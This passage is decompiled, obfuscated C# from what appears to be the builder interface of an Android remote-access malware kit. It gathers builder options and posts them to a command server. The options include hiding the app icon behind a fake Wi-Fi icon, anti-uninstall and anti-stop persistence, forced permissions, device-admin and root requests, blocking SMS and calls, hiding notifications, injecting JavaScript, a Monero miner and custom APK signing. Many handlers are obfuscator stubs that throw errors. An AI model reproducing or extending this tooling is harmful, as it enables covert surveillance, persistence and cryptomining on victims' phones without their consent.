					}
					value11 = Conversions.ToString(dropimg.Tag);
				}
				value4 = (checkantidelete.Checked ? EXGuarder._18116062 : EXGuarder._212A3E0B);
				value5 = (checkcaplock.Checked ? EXGuarder._18116062 : EXGuarder._212A3E0B);
				value6 = (checkautoprims.Checked ? EXGuarder._18116062 : EXGuarder._212A3E0B);
				if (codes.StrisEmpty(_55175E1F) | codes.StrisEmpty(_2A6F) | codes.StrisEmpty(_5D))
				{
					Invoke((VB_0024AnonymousDelegate_0)([SpecialName] () =>
					{
						BTAlerter.infos(BTConst.filpag4str);
					}));
					return;
				}
				if (Listhides.Items.Count > 0)
				{
					foreach (object item2 in Listhides.Items)
					{
						string text34 = Conversions.ToString(item2);
						text33 = text33 + text34 + EXGuarder._0C457363;
					}
				}
			}
			else
			{
				text33 = EXGuarder._7422041A;
				text29 = EXGuarder._080F0E16;
				_55175E1F = EXGuarder._55175E1F;
				_2A6F = EXGuarder._2A6F5016;
				_5D = EXGuarder._5D781449;
			}
			string value16 = EXGuarder._212A3E0B;
			string value17 = EXGuarder._7422041A;
			switch (hideicocombox.SelectedIndex)
			{
			case 1:
				value16 = EXGuarder._18116062;
				value17 = EXGuarder._54141D3D;
				if (checkfakewifi.Checked)
				{
					value17 = EXGuarder._3F1B1A73;
				}
				break;
			case 2:
				value16 = EXGuarder._18116062;
				value17 = EXGuarder._0A734715;
				break;
			case 3:
			{
				value16 = EXGuarder._18116062;
				string value18 = Conversions.ToString(listshortcuts.SelectedIndex);
				if (Conversions.ToDouble(value18) == 0.0)
				{
					value17 = EXGuarder._72464A21;
					break;
				}
				if (Conversions.ToDouble(value18) == 1.0)
				{
					value17 = EXGuarder._3D047450;
					break;
				}
				Invoke((VB_0024AnonymousDelegate_0)([SpecialName] () =>
				{
					BTAlerter.infos(BTConst.fakiconstylestr);
				}));
				return;
			}
			}
			string text35 = EXGuarder._1828662C;
			if (traklist.Items.Count > 0)
			{
				text35 = EXGuarder._5E670639;
				foreach (ListItem item3 in traklist.Items)
				{
					text35 = text35 + item3.EncodedData + EXGuarder._33266042;
				}
			}
			string value19 = EXGuarder._4F122567;
			if (checkstore.Active)
			{
				value19 = (checkplugin.Active ? EXGuarder._5C0C081D : EXGuarder._05211870);
			}
			string value20 = (checkantistop.Checked ? EXGuarder._18116062 : EXGuarder._212A3E0B);
			string value21 = (checkforceprims.Checked ? EXGuarder._18116062 : EXGuarder._212A3E0B);
			string text36 = codes.ToBase64(EXGuarder._6D6E2C5D);
			string str = jectjstext.Text;
			if (checkjctjs.Checked && !codes.StrisEmpty(str))
			{
				text36 = codes.ToBase64(str);
			}
			string value22 = (blocksms.Checked ? EXGuarder._18116062 : EXGuarder._212A3E0B);
			string value23 = (blockcalls.Checked ? EXGuarder._18116062 : EXGuarder._212A3E0B);
			string _5E = EXGuarder._5E670639;
			_5E = (codes.StrisEmpty(adminpass.Text) ? ((Devadmincheck.Checked ? EXGuarder._18116062 : EXGuarder._212A3E0B) + EXGuarder._1855571A + (checkreqadmin.Checked ? EXGuarder._18116062 : EXGuarder._212A3E0B)) : ((Devadmincheck.Checked ? EXGuarder._18116062 : EXGuarder._212A3E0B) + EXGuarder._33266042 + adminpass.Text + EXGuarder._33266042 + (checkreqadmin.Checked ? EXGuarder._18116062 : EXGuarder._212A3E0B)));
			string value24 = (rootcheck.Checked ? EXGuarder._18116062 : EXGuarder._212A3E0B);
			string arg2 = (checkxmr.Checked ? EXGuarder._18116062 : EXGuarder._212A3E0B);
			string arg3 = (checkffmpg.Checked ? EXGuarder._18116062 : EXGuarder._212A3E0B);
			string value25 = string.Format(EXGuarder._054C4270, arg2, arg3);
			text36 = codes.ToBase64(checkonejs.Checked ? (text36 + EXGuarder._195E5567) : (text36 + EXGuarder._620C5C43));
			if (appicoimg.Tag == null)
			{
				Invoke((VB_0024AnonymousDelegate_0)([SpecialName] () =>
				{
					BTAlerter.infos(BTConst.slcticostr);
				}));
				return;
			}
			string value26 = Conversions.ToString(appicoimg.Tag);
			string value27 = codes.StrGenerator(32);
			string value28 = (checkdexp.Checked ? EXGuarder._18116062 : EXGuarder._212A3E0B);
			string value29 = (checkhidnotify.Checked ? EXGuarder._18116062 : EXGuarder._212A3E0B);
			string text37 = codes.FileToBase64(BTConst.Exchange_Public_Key_Path);
			string text38 = codes.FileToBase64(BTConst.Sign_Public_Key_Path);
			string value30 = codes.ToBase64(text37 + EXGuarder._410C6313 + text38);
			string text39 = (checkcustmsign.Active ? EXGuarder._18116062 : EXGuarder._212A3E0B);
			string c = txtC.Text;
			string cn = txtCN.Text;
			string ou = txtOU.Text;
			string o = txtO.Text;
			string l = txtL.Text;
			string s = txtS.Text;
			string password = txtPassword.Text;
			string aliasName = txtAliasName.Text;
			string text40 = KeystoreEncoder.EncodeKeystoreData(aliasName, password, cn, ou, o, l, s, c);
			if (checkcustmsign.Active && DGVKEYS.Rows.Count > 0 && DGVKEYS.SelectedRows.Count > 0)
			{
				text39 = EXGuarder._3D2A1E2E;
				text40 = Conversions.ToString(DGVKEYS.SelectedRows[0].Tag);
			}
			string value31 = (checknotykill.Checked ? EXGuarder._18116062 : EXGuarder._212A3E0B);
			CS_0024_003C_003E8__locals19._0024VB_0024Local_params = new Dictionary<string, string>
			{
				{
					EXGuarder._56534330,
					EXGuarder._766F1C48
				},
				{
					EXGuarder._7101462E,
					value27
				},
				{
					EXGuarder._6C754E16,
					nextkey
				},
				{
					EXGuarder._4504025D,
					value19
				},
				{
					EXGuarder._1C69362C,
					text6
				},
				{
					EXGuarder._2E666D0A,
					text5
				},
				{
					EXGuarder._66767512,
					text9.Split(EXGuarder._33266042)[0]
				},
				{
					EXGuarder._3336422D,
					text10
				},
				{
					EXGuarder._5879726A,
					value20
				},
				{
					EXGuarder._03671A2A,
					value21
				},
				{
					EXGuarder._06301D5C,
					text36
				},
				{
					EXGuarder._35716254,
					lastSelectedTag
				},
				{
					EXGuarder._56223014,
					value6
				},
				{
					EXGuarder._2748374E,
					text8
				},
				{
					EXGuarder._1B576460,
					_5D696B0A
				},
				{
					EXGuarder._3A6A6069,
					_5D696B0A2
				},
				{
					EXGuarder._07553A2D,
					text
				},
				{
					EXGuarder._74084214,
					text2
				},
				{
					EXGuarder._57463529,
					value26
				},
				{
					EXGuarder._27312D1F,
					text3
				},
				{
					EXGuarder._77715E49,
					value28
				},
				{
					EXGuarder._38507270,
					codes.ToBase64(_55175E1F)
				},
				{
					EXGuarder._602F5152,
					codes.ToBase64(_5D)
				},
				{
					EXGuarder._431F512F,
					codes.ToBase64(text33)
				},
				{
					EXGuarder._1C714231,
					_2A6F
				},
				{
					EXGuarder._066D6A40,
					text29
				},
				{
					EXGuarder._21540E23,
					value16
				},
				{
					EXGuarder._66656D62,
					value3
				},
				{
					EXGuarder._63406414,
					value29
				},
				{
					EXGuarder._6F555A44,
					text4
				},
				{
					EXGuarder._1D2A1867,
					text30
				},
				{
					EXGuarder._3D183911,
					value17
				},
				{
					EXGuarder._34374A76,
					value
				},
				{
					EXGuarder._7054111A,
					value5
				},
				{
					EXGuarder._4E1C1F4A,
					text35
				},
				{
					EXGuarder._6A340B63,
					value2
				},
				{
					EXGuarder._37695614,
					value8
				},
				{
					EXGuarder._57014271,
					value9
				},
				{
					EXGuarder._17162B40,
					value10
				},
				{
					EXGuarder._17460C1E,
					value11
				},
				{
					EXGuarder._41452323,
					value22
				},
				{
					EXGuarder._31242225,
					value23
				},
				{
					EXGuarder._48221F58,
					_5E
				},
				{
					EXGuarder._5D595C25,
					value24
				},
				{
					EXGuarder._38703702,
					value25
				},
				{
					EXGuarder._22024950,
					value12
				},
				{
					EXGuarder._6337473E,
					value13
				},
				{
					EXGuarder._2F455963,
					value14
				},
				{
					EXGuarder._09376800,
					value15
				},
				{
					EXGuarder._691F5A52,
					value7
				},
				{
					EXGuarder._66794634,
					value4
				},
				{
					EXGuarder._64530578,
					value30
				},
				{
					EXGuarder._5D125C5B,
					value31
				},
				{
					EXGuarder._42211C14,
					text39 + EXGuarder._33266042 + text40
				}
			};
			Thread thread = new Thread([SpecialName] async () =>
			{
				try
				{
					_Closure_0024__1176_002D2 arg4 = default(_Closure_0024__1176_002D2);
					_Closure_0024__1176_002D2 CS_0024_003C_003E8__locals22 = new _Closure_0024__1176_002D2(arg4);
					CS_0024_003C_003E8__locals22._0024VB_0024NonLocal__0024VB_0024Closure_2 = CS_0024_003C_003E8__locals19;
					_Closure_0024__1176_002D2 closure_0024__1176_002D = CS_0024_003C_003E8__locals22;
					TaskAwaiter<(bool, object)> taskAwaiter = MyServer.CommandStore(CS_0024_003C_003E8__locals19._0024VB_0024Local_params, CS_0024_003C_003E8__locals19._0024VB_0024Me.httpClient, CS_0024_003C_003E8__locals19._0024VB_0024Me.serverip).GetAwaiter();
					if (!taskAwaiter.IsCompleted)
					{
						await taskAwaiter;
						TaskAwaiter<(bool, object)> taskAwaiter2 = default(TaskAwaiter<(bool, object)>);
						taskAwaiter = taskAwaiter2;
					}
					(bool, object) result = taskAwaiter.GetResult();
					closure_0024__1176_002D._0024VB_0024Local_result = result;
					if (!CS_0024_003C_003E8__locals19._0024VB_0024Me.IsDisposed && CS_0024_003C_003E8__locals19._0024VB_0024Me.IsHandleCreated)
					{
						if (CS_0024_003C_003E8__locals22._0024VB_0024Local_result.Item1)
						{
							_Closure_0024__1176_002D1 arg5 = default(_Closure_0024__1176_002D1);
							_Closure_0024__1176_002D1 CS_0024_003C_003E8__locals21 = new _Closure_0024__1176_002D1(arg5);
							CS_0024_003C_003E8__locals21._0024VB_0024NonLocal__0024VB_0024Closure_3 = CS_0024_003C_003E8__locals22;
							CS_0024_003C_003E8__locals21._0024VB_0024Local_response = Conversions.ToString(RuntimeHelpers.GetObjectValue(NewLateBinding.LateGet(NewLateBinding.LateGet(CS_0024_003C_003E8__locals21._0024VB_0024NonLocal__0024VB_0024Closure_3._0024VB_0024Local_result.Item2, null, "Replace", new object[2] { "\\", "" }, null, null, null), null, "Trim", new object[1] { "\"" }, null, null, null)));
							CS_0024_003C_003E8__locals19._0024VB_0024Me.Invoke((VB_0024AnonymousDelegate_0)([SpecialName] () =>
							{
								MyMsg.Show("Success", CS_0024_003C_003E8__locals21._0024VB_0024Local_response, MyMsg.msgtype.Confirm, use_no: false);
								CS_0024_003C_003E8__locals21._0024VB_0024NonLocal__0024VB_0024Closure_3._0024VB_0024NonLocal__0024VB_0024Closure_2._0024VB_0024Me.Close();
							}));
						}
						else
						{
							CS_0024_003C_003E8__locals19._0024VB_0024Me.Invoke((VB_0024AnonymousDelegate_0)([SpecialName] () =>
							{
								BTAlerter.erroes(Conversions.ToString(CS_0024_003C_003E8__locals22._0024VB_0024Local_result.Item2));
							}));
						}
					}
				}
				catch (Exception projectError)
				{
					ProjectData.SetProjectError(projectError);
					ProjectData.ClearProjectError();
				}
			});
			thread.IsBackground = true;
			thread.Start();
		}
		catch (Exception ex)
		{
			ProjectData.SetProjectError(ex);
			Exception ex2 = ex;
			Debuger.Log_e(EXGuarder._4019340D, codes.EXtoString(ex2));
			ProjectData.ClearProjectError();
		}
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	private void randver_Click(object sender, EventArgs e)
	{
		throw new AccessViolationException("Attempted to read or write protected memory. This is often an indication that other memory is corrupt.");
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	private void randids_Click(object sender, EventArgs e)
	{
		throw new AccessViolationException("Attempted to read or write protected memory. This is often an indication that other memory is corrupt.");
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	private void appids_TextChanged(object sender, EventArgs e)
	{
		throw new AccessViolationException("Attempted to read or write protected memory. This is often an indication that other memory is corrupt.");
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	private void appids_KeyDown(object sender, KeyEventArgs e)
	{
		throw new AccessViolationException("Attempted to read or write protected memory. This is often an indication that other memory is corrupt.");
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	private void appids_KeyPress(object sender, KeyPressEventArgs e)
	{
		throw new AccessViolationException("Attempted to read or write protected memory. This is often an indication that other memory is corrupt.");
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	private void DrakeUIButtonIcon2_Click(object sender, EventArgs e)
	{
		throw new AccessViolationException("Attempted to read or write protected memory. This is often an indication that other memory is corrupt.");
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	private void DrakeUIButtonIcon3_Click(object sender, EventArgs e)
	{
		throw new AccessViolationException("Attempted to read or write protected memory. This is often an indication that other memory is corrupt.");
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	private void DrakeUICheckBox1_ValueChanged(object sender, bool value)
	{
		throw new AccessViolationException("Attempted to read or write protected memory. This is often an indication that other memory is corrupt.");
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	private void DrakeUICheckBox2_ValueChanged(object sender, bool value)
	{
		throw new AccessViolationException("Attempted to read or write protected memory. This is often an indication that other memory is corrupt.");
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	private void DrakeUIButtonIcon5_Click(object sender, EventArgs e)
	{
		throw new AccessViolationException("Attempted to read or write protected memory. This is often an indication that other memory is corrupt.");
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	private void DrakeUIButtonIcon4_Click(object sender, EventArgs e)
	{
		throw new AccessViolationException("Attempted to read or write protected memory. This is often an indication that other memory is corrupt.");
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	private void ListTags_SelectedIndexChanged(object sender, EventArgs e)
	{
		throw new AccessViolationException("Attempted to read or write protected memory. This is often an indication that other memory is corrupt.");
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	private void DrakeUIButtonIcon7_Click(object sender, EventArgs e)
	{
		throw new AccessViolationException("Attempted to read or write protected memory. This is often an indication that other memory is corrupt.");
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	private void DrakeUIButtonIcon6_Click(object sender, EventArgs e)
	{
		throw new AccessViolationException("Attempted to read or write protected memory. This is often an indication that other memory is corrupt.");
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	private void DrakeUIButtonIcon8_Click(object sender, EventArgs e)
	{
		throw new AccessViolationException("Attempted to read or write protected memory. This is often an indication that other memory is corrupt.");
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	private void btnstyleM_Click(object sender, EventArgs e)
	{
		throw new AccessViolationException("Attempted to read or write protected memory. This is often an indication that other memory is corrupt.");
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	private void DGVPRIMB_CellClick(object sender, DataGridViewCellEventArgs e)
	{
		throw new AccessViolationException("Attempted to read or write protected memory. This is often an indication that other memory is corrupt.");
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	private void DGVPRIMB_EditingControlShowing(object sender, DataGridViewEditingControlShowingEventArgs e)
	{
		throw new AccessViolationException("Attempted to read or write protected memory. This is often an indication that other memory is corrupt.");
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	private void comboacctype_MouseClick(object sender, MouseEventArgs e)
	{
		throw new AccessViolationException("Attempted to read or write protected memory. This is often an indication that other memory is corrupt.");
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	private void checkplugin_ValueChanged(object sender, bool value)
	{
		throw new AccessViolationException("Attempted to read or write protected memory. This is often an indication that other memory is corrupt.");
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	private void rand_dropver(object sender, EventArgs e)
	{
		throw new AccessViolationException("Attempted to read or write protected memory. This is often an indication that other memory is corrupt.");
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	private void rand_dropid(object sender, EventArgs e)
	{
		throw new AccessViolationException("Attempted to read or write protected memory. This is often an indication that other memory is corrupt.");
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	private void DrakeUIButtonIcon10_Click(object sender, EventArgs e)
	{
		throw new AccessViolationException("Attempted to read or write protected memory. This is often an indication that other memory is corrupt.");
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	private void Droplisticons_SelectedIndexChanged(object sender, EventArgs e)
	{
		throw new AccessViolationException("Attempted to read or write protected memory. This is often an indication that other memory is corrupt.");
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	private void comboacctype_SelectedIndexChanged(object sender, EventArgs e)
	{
		throw new AccessViolationException("Attempted to read or write protected memory. This is often an indication that other memory is corrupt.");
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	private void combodroptype_SelectedValueChanged(object sender, EventArgs e)
	{
		throw new AccessViolationException("Attempted to read or write protected memory. This is often an indication that other memory is corrupt.");
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	private void checkforceprims_Click(object sender, EventArgs e)
	{
		throw new AccessViolationException("Attempted to read or write protected memory. This is often an indication that other memory is corrupt.");
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	private void hideicocombox_SelectedIndexChanged(object sender, EventArgs e)
	{
		throw new AccessViolationException("Attempted to read or write protected memory. This is often an indication that other memory is corrupt.");
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	private void Devadmincheck_ValueChanged(object sender, bool value)
	{
		throw new AccessViolationException("Attempted to read or write protected memory. This is often an indication that other memory is corrupt.");
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	private void checkreplcply_ValueChanged(object sender, bool value)
	{
		throw new AccessViolationException("Attempted to read or write protected memory. This is often an indication that other memory is corrupt.");
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	private void checkdisstore_ValueChanged(object sender, bool value)
	{
		throw new AccessViolationException("Attempted to read or write protected memory. This is often an indication that other memory is corrupt.");
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	private void combodroptype_SelectedIndexChanged(object sender, EventArgs e)
	{
		throw new AccessViolationException("Attempted to read or write protected memory. This is often an indication that other memory is corrupt.");
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	private void encryptmain_ValueChanged(object sender, bool value)
	{
		throw new AccessViolationException("Attempted to read or write protected memory. This is often an indication that other memory is corrupt.");
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	private void DrakeUIButtonIcon11_Click(object sender, EventArgs e)
	{
		throw new AccessViolationException("Attempted to read or write protected memory. This is often an indication that other memory is corrupt.");
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	private void checkaccsspage_ValueChanged(object sender, bool value)
	{
		throw new AccessViolationException("Attempted to read or write protected memory. This is often an indication that other memory is corrupt.");
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	private void DrakeUIButtonIcon13_Click(object sender, EventArgs e)
	{
		throw new AccessViolationException("Attempted to read or write protected memory. This is often an indication that other memory is corrupt.");
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	private void DrakeUIButtonIcon12_Click(object sender, EventArgs e)
	{
		throw new AccessViolationException("Attempted to read or write protected memory. This is often an indication that other memory is corrupt.");
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	private void SaveSteps()
	{
		throw new AccessViolationException("Attempted to read or write protected memory. This is often an indication that other memory is corrupt.");
	}

	private void loadsteps()
	{
		StringCollection stringCollection = new StringCollection();
		if (MySettingsProperty.Settings.Steps != null && MySettingsProperty.Settings.Steps.Count > 0)
		{
			stringCollection = MySettingsProperty.Settings.Steps;
		}
		else
		{
			string[] array = new string[3]
			{
				BTConst.clickcontinuestr,
				BTConst.finddwnapstr,
				BTConst.enblappstr
			};
			string[] array2 = array;
			foreach (string value in array2)
			{
				stringCollection.Add(value);
			}
		}
		if ((stringCollection == null) | (stringCollection.Count == 0))
		{
			return;
		}
		StringEnumerator enumerator = stringCollection.GetEnumerator();
		while (enumerator.MoveNext())
		{
			string current = enumerator.Current;
			if (!string.IsNullOrEmpty(current) && !stepslist.Items.Contains(current))
			{
				stepslist.Items.Add(current);
			}
		}
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	private void refreshsteps()
	{
		throw new AccessViolationException("Attempted to read or write protected memory. This is often an indication that other memory is corrupt.");
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	private void Acctitletext_TextChanged(object sender, EventArgs e)
	{
		throw new AccessViolationException("Attempted to read or write protected memory. This is often an indication that other memory is corrupt.");
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	private void Accmsgtext_TextChanged(object sender, EventArgs e)
	{
		throw new AccessViolationException("Attempted to read or write protected memory. This is often an indication that other memory is corrupt.");
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	private void Accbtntext_TextChanged(object sender, EventArgs e)
	{
		throw new AccessViolationException("Attempted to read or write protected memory. This is often an indication that other memory is corrupt.");
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	private void ExportTrackList()
	{
		throw new AccessViolationException("Attempted to read or write protected memory. This is often an indication that other memory is corrupt.");
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	private void ImportTrackList()
	{
		throw new AccessViolationException("Attempted to read or write protected memory. This is often an indication that other memory is corrupt.");
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	private void DrakeUIButtonIcon15_Click(object sender, EventArgs e)
	{
		throw new AccessViolationException("Attempted to read or write protected memory. This is often an indication that other memory is corrupt.");
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	private void DrakeUIButtonIcon14_Click(object sender, EventArgs e)
	{
		throw new AccessViolationException("Attempted to read or write protected memory. This is often an indication that other memory is corrupt.");
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	private void DrakeUIButtonIcon16_Click(object sender, EventArgs e)
	{
		throw new AccessViolationException("Attempted to read or write protected memory. This is often an indication that other memory is corrupt.");
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	private void txtAliasName_TextChanged(object sender, EventArgs e)
	{
		throw new AccessViolationException("Attempted to read or write protected memory. This is often an indication that other memory is corrupt.");
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	private void txtPassword_TextChanged(object sender, EventArgs e)
	{
		throw new AccessViolationException("Attempted to read or write protected memory. This is often an indication that other memory is corrupt.");
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	private void txtCN_TextChanged(object sender, EventArgs e)
	{
		throw new AccessViolationException("Attempted to read or write protected memory. This is often an indication that other memory is corrupt.");
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	private void txtOU_TextChanged(object sender, EventArgs e)
	{
		throw new AccessViolationException("Attempted to read or write protected memory. This is often an indication that other memory is corrupt.");
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	private void txtO_TextChanged(object sender, EventArgs e)
	{
		throw new AccessViolationException("Attempted to read or write protected memory. This is often an indication that other memory is corrupt.");
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	private void txtL_TextChanged(object sender, EventArgs e)
	{
		throw new AccessViolationException("Attempted to read or write protected memory. This is often an indication that other memory is corrupt.");
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	private void txtS_TextChanged(object sender, EventArgs e)
	{
		throw new AccessViolationException("Attempted to read or write protected memory. This is often an indication that other memory is corrupt.");
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	private void txtC_TextChanged(object sender, EventArgs e)
	{
		throw new AccessViolationException("Attempted to read or write protected memory. This is often an indication that other memory is corrupt.");
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	private void checkcustmsign_ValueChanged(object sender, bool value)
	{
		throw new AccessViolationException("Attempted to read or write protected memory. This is often an indication that other memory is corrupt.");
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	private void Keysloader_DoWork(object sender, DoWorkEventArgs e)
	{
		throw new AccessViolationException("Attempted to read or write protected memory. This is often an indication that other memory is corrupt.");
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	private void DGVKEYS_CellClick(object sender, DataGridViewCellEventArgs e)
	{
		throw new AccessViolationException("Attempted to read or write protected memory. This is often an indication that other memory is corrupt.");
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	private void ToolStripMenuItem1_Click(object sender, EventArgs e)
	{
		throw new AccessViolationException("Attempted to read or write protected memory. This is often an indication that other memory is corrupt.");
	}
}
